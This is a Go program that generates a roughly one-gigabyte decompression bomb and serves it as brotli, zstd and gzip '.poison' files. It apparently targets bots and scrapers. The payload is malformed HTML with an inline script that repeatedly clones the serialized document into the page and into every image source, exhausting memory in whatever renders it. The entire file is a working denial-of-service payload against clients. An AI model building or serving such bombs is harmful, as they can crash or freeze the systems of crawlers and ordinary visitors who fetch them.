package main

import (
	"bytes"
	"compress/gzip"
	"flag"
	"fmt"
	"github.com/andybalholm/brotli"
	"github.com/klauspost/compress/zstd"
	"io"
	"math/rand/v2"
	"os"
	"path"
	"slices"
	"strings"
	"sync"
)

type poisonCharacterGenerator struct {
	Header       []byte
	AllowedBytes []byte
	Repeat       int
	counter      int
}

func (r *poisonCharacterGenerator) Read(p []byte) (n int, err error) {
	if len(r.Header) > 0 {
		copy(p, r.Header)
		nn := min(len(r.Header), len(p))
		r.Header = r.Header[nn:]
		p = p[nn:]
	}

	stride := min(len(p), r.Repeat)
	for i := 0; i < len(p); i += stride {
		copy(p[i:], bytes.Repeat([]byte{r.AllowedBytes[r.counter]}, stride))
		r.counter = (r.counter + 1) % len(r.AllowedBytes)
	}
	return len(p), nil
}

type poisonValuesGenerator struct {
	Header        []byte
	AllowedValues [][]byte
	counter       int
}

func (r *poisonValuesGenerator) Read(p []byte) (n int, err error) {
	var i int

	if len(r.Header) > 0 {
		copy(p, r.Header)
		nn := min(len(r.Header), len(p))
		r.Header = r.Header[nn:]
		i += nn

		for i < len(p) {
			copy(p[i:], r.AllowedValues[r.counter])
			i += len(r.AllowedValues[r.counter])
			r.counter = (r.counter + 1) % len(r.AllowedValues)
			if r.counter == 0 {
				break
			}
		}
	}

	for i < len(p) {
		buf := slices.Repeat(r.AllowedValues[r.counter], len(r.AllowedValues)-r.counter)
		copy(p[i:], buf)
		i += len(buf)
		r.counter = (r.counter + 1) % len(r.AllowedValues)
	}
	return len(p), nil
}

func main() {

	outputPath := flag.String("path", "./", "path to poison files")

	flag.Parse()

	const Gigabyte = 1024 * 1024 * 1024

	compressPoison(*outputPath, "text/html", &poisonValuesGenerator{
		Header: []byte(fmt.Sprintf("<!DOCTYPE html><html><head><title>%d</title></head><body>", rand.Uint64())),
		AllowedValues: [][]byte{
			[]byte("<div><div class=\"\"><h2></h2></div><br>\n"),
			[]byte("<span><span><p><span>\n"),
			[]byte("<p></span></script><h3><p><span>\n"),
			[]byte("<div><span><p></h1>"),
			[]byte("</div></div></div>\n"),
			[]byte("</p></p></p>"),
			[]byte("<h1>Are you a bot?</h1><img>\n"),
			[]byte("</span></span></span><script>{let a = (new XMLSerializer).serializeToString(document); console.log(a); let b = URL.createObjectURL(new Blob([a])); Array.from(document.getElementsByTagName(\"img\")).forEach((img) => {img.src = b;}); document.getElementsByTagName(\"body\")[0].prepend((new DOMParser()).parseFromString(a, \"text/html\"));}</script>"),
		},
	}, Gigabyte)
}

var poisonEncodings = []string{"br", "zstd", "gzip"}

func compressPoison(outputPath, mime string, r io.Reader, maxSize int64) {
	r = io.LimitReader(r, maxSize)

	var closers []func()
	var encoders []io.Writer
	var writers []io.Writer
	var readers []io.Reader

	for _, encoding := range poisonEncodings {
		f, err := os.Create(path.Join(outputPath, strings.ReplaceAll(mime, "/", "_")+"."+encoding+".poison"))
		if err != nil {
			panic(err)
		}
		switch encoding {
		case "zstd":
			w, err := zstd.NewWriter(f, zstd.WithEncoderLevel(zstd.SpeedBestCompression), zstd.WithEncoderCRC(false), zstd.WithWindowSize(zstd.MaxWindowSize))
			if err != nil {
				panic(err)
			}
			encoders = append(encoders, w)
			closers = append(closers, func() {
				w.Close()
				f.Close()
			})
		case "br":
			w := brotli.NewWriterLevel(f, brotli.BestCompression)
			encoders = append(encoders, w)
			closers = append(closers, func() {
				w.Close()
				f.Close()
			})
		case "gzip":
			w, err := gzip.NewWriterLevel(f, gzip.BestCompression)
			if err != nil {
				panic(err)
			}
			encoders = append(encoders, w)
			closers = append(closers, func() {
				w.Close()
				f.Close()
			})
		}
		r, w := io.Pipe()
		readers = append(readers, r)
		writers = append(writers, w)
	}

	var wg sync.WaitGroup

	for i := range poisonEncodings {
		wg.Add(1)
		go func() {
			defer wg.Done()

			_, err := io.Copy(encoders[i], readers[i])
			if err != nil {
				panic(err)
			}
			closers[i]()

			// discard remaining data
			_, _ = io.Copy(io.Discard, readers[i])
		}()
	}

	_, err := io.Copy(io.MultiWriter(writers...), r)
	if err != nil {
		panic(err)
	}

	for _, w := range writers {
		if pw, ok := w.(io.Closer); ok {
			pw.Close()
		} else {
			panic("writer is not a Closer")
		}
	}

	wg.Wait()
}
